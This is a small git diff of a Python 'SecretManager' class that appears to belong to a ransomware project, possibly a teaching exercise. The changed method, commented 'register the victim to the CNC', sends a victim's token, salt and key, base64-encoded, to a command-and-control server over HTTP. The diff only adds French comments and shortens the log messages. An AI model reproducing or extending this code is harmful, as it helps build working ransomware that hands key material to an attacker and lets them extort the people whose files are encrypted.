@@ -51,15 +51,19 @@ class SecretManager:
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         # register the victim to the CNC
-        url = f"http://{self._remote_host_port}/new"
-        data = { "token" : self.bin_to_b64(token),
+        url = f"http://{self._remote_host_port}/new" # création de l'url
+        # création du dictionnaire contenant les données à envoyer en base64
+        data = { 
+        "token" : self.bin_to_b64(token),
         "salt" : self.bin_to_b64(salt),
         "key" : self.bin_to_b64(key)}
-        response = requests.post(url, json=data)
+        # envoi de la requête
+        response = requests.post(url, json=data) 
+        # vérification du status de la requête
         if response.status_code != 200:
-            self._log.info("Echec de l'envoi des nouveaux elements cryptographiques")
+            self._log.info("Echec de l'envoi")
         else:
-            self._log.info("Envoi des nouveaux elements cryptographiques reussi")
+            self._log.info("Envoi reussi")
         
 
     def setup(self)->None:
